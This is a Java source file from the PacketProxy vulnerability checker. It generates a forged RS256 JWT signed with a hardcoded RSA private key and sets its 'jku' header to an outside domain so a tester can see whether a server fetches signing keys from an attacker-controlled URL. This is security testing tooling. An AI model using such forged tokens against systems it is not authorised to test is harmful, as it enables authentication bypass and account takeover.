/*
 * Copyright 2023 DeNA Co., Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package packetproxy.vulchecker.generator;

import org.apache.commons.codec.binary.Hex;

public class JWTHeaderJKUModifiedGenerator extends Generator {
    @Override
    public String getName() {
        return "Header: jku: 制御可能な別のドメインに変更";
    }

    @Override
    public boolean generateOnStart() {
        return true;
    }

    @Override
    public String generate(String inputData) throws Exception {
        byte[] secretKey = Hex.decodeHex("308204be020100300d06092a864886f70d0101010500048204a8308204a40201000282010100da95d3357eb528a747674c29aa304cecc999eb2e7c1411f2f774fdfd24d359423228f029a045b93a13704bb815627ae6f208168487e7cf75326cc34e3df2da4f660d7e51af5ba8d27ee4ee5b25583b2d4d001b725befd39f6d681edbb5abf0eb5fad888665fdd410011e1a59618d59aa1b2d1ed9d920893bb42716178355b577e2186656ef6a6828b230c00ef3cdac00c4787fba896b15d63b072a5f7f37ee07064d961ce463e2dcffbfa579c022bfb97b58c140ec723f163f96fa3700f1769cb077a4b0ed8d3cea8978cf19440a59845f14459419da5d42996b704ca9c5c727040c8ccef8204612736f123e8b8261625e43f41222edd8c3643956c3869f4b710203010001028201005def6d28dc1ef62d8d1df339248e4540ad129c6309a7865f27c0fb35c291a11635802a55792efd7edbc3b286958a10cf16cc2b012176994d0032856c266b2b2e5be908940a0c15ecffe35a1b895cf5716e59d171bfd8bcd512ab6037834734edb1dc5d83846924ad0c0de7bce9935929252caac96be9f38fd8c7c352af7a31d55b9e58f9615ed4e60216c845e30266f66876304c6abd13ea9a1c1acd6413d4ba1489fd657a5d5788991783773e0747136198a981f7bdcef5e37cd1ad69341e04c428815fdd47996dd5421bc6817b39e0992cb0f03fa36ab4fab33e8457c584543eae3ce40adc2cb995bc123d35971ea3bd88b7a11100e5ab6155faebbd93880102818100f8ad7c8b7ad087decd0349be61287f706e3c77705010929f7128c1dc8135a8d7634217e95c3b8f2851080307bf36df88cf9721fb8d9d7cda768f1a33c4ac9e0a886801ee89de3aa0724b61293b48669d6768b1ac27301fa778dc2f12242316020cbd496fa15229a3d7867098f4380ae153545123ce6afbcc1bf76c008865fad102818100e105810c6820d1725f14924dff76a756c96058fb6859faba2b6e294e9c1ee9d6131090c90a42450923357755e28a066a41b2c27a7a931b6c726fc6e7af958851dadc489f91f90be950f39c2e1631cb175e84414a82af1763bd8dae298ee3d86e9089bb430df0d65122e485ee1760d77a59e70b973eeec982fb050cf5997b2ea102818100a3a4cebb9eb351660db56736d00aed6a1830d44c6573b27917e741439107b5b71f8b63dede22177fe96b034b7aca6a69466a672379bab469b2f152c5d45bdf9880d128cc478fa536e65fb26d86a48b5a73ad52963e278dfd102c9d112c14a6abeca4378a2d37bb4d254c44167347d9e91383fded392defcb0e7050733d4f16b102818100bf2acae8bc69ed264a4a92c4fadc55ebf0270f517ee4ba92812514a8b90fb63eed716c5faf7c7f63f4ea8e58839e19371a5b80c746ed45260bce945fee968dfa6482329c8609dba9bae14b7507dc039af5ec4bffbe287c297b372b9818d1cee4979cbb5f8b2f6914031dbbfe7b1405dbe716d78d05a51dc34df88b7af78a64210281807b0ec728cb6a9ac6c8224f72233b2d60136fca48bb7081bc64fa4a69d03df3276780a7ae82fc9f1fcceba07fbe46fe49adffce3a73897c01ff865ad9499fcd7d3e4e971f8cc6a731fe0b8ee163dba8dd7c384a073b4579bf2132f111fbcd466560d40199071cceaa296e18f64ed5ac8248263e03d532eca8ec33bc2d01d36dcb".toCharArray());
        JWTAlgRS256 jwt = new JWTAlgRS256(inputData, secretKey);
        jwt.setHeaderValue("alg", "RS256");
        jwt.setHeaderValue("jku", "https://certs.funacs.com/");
        jwt.setHeaderValue("kid", "111-222-333");
        return jwt.toJwtString();
    }
}